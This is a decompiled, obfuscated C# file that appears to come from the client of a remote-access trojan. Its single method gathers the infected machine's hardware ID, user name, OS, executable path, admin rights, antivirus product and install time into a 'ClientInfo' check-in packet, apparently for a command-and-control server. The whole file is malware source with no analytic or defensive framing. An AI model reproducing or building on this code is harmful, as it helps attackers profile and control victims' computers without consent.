using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;
using XQTTiTqzQXXI;
using YDfIqHIitkNiPV;

namespace ktQiwKnbqDow;

public static class gwzHUqyCURbw
{
	public static byte[] aUoYadofyqGw()
	{
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		UsnwLsVggjVevszVi usnwLsVggjVevszVi = new UsnwLsVggjVevszVi();
		usnwLsVggjVevszVi.twuQjjnvvWt("Packet").dQdRsEbxlbxwL = "ClientInfo";
		usnwLsVggjVevszVi.twuQjjnvvWt("HWID").dQdRsEbxlbxwL = OOyHmWyLirxV.bRvphStTyKGSHuM;
		usnwLsVggjVevszVi.twuQjjnvvWt("User").dQdRsEbxlbxwL = Environment.UserName.ToString();
		usnwLsVggjVevszVi.twuQjjnvvWt("OS").dQdRsEbxlbxwL = new ComputerInfo().get_OSFullName().ToString().Replace("Microsoft", null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
		usnwLsVggjVevszVi.twuQjjnvvWt("Path").dQdRsEbxlbxwL = Application.get_ExecutablePath();
		usnwLsVggjVevszVi.twuQjjnvvWt("Version").dQdRsEbxlbxwL = OOyHmWyLirxV.puQKEPjhvZZGDV;
		usnwLsVggjVevszVi.twuQjjnvvWt("Admin").dQdRsEbxlbxwL = oEzmcrieBfuvH.qkksKQptGloEOQ().ToString().ToLower()
			.Replace("true", "Admin")
			.Replace("false", "User");
		usnwLsVggjVevszVi.twuQjjnvvWt("Performance").dQdRsEbxlbxwL = oEzmcrieBfuvH.oWJPqhLtncf();
		usnwLsVggjVevszVi.twuQjjnvvWt("Pastebin").dQdRsEbxlbxwL = OOyHmWyLirxV.WOtgGEJilCgqVzNd;
		usnwLsVggjVevszVi.twuQjjnvvWt("Antivirus").dQdRsEbxlbxwL = oEzmcrieBfuvH.IvTSMVjJHgPneD();
		usnwLsVggjVevszVi.twuQjjnvvWt("Installed").dQdRsEbxlbxwL = new FileInfo(Application.get_ExecutablePath()).LastWriteTime.ToUniversalTime().ToString();
		usnwLsVggjVevszVi.twuQjjnvvWt("Pong").dQdRsEbxlbxwL = "";
		usnwLsVggjVevszVi.twuQjjnvvWt("Group").dQdRsEbxlbxwL = OOyHmWyLirxV.NkokstpaIvwYi;
		return usnwLsVggjVevszVi.mTRfDZbSUzkmH();
	}
}
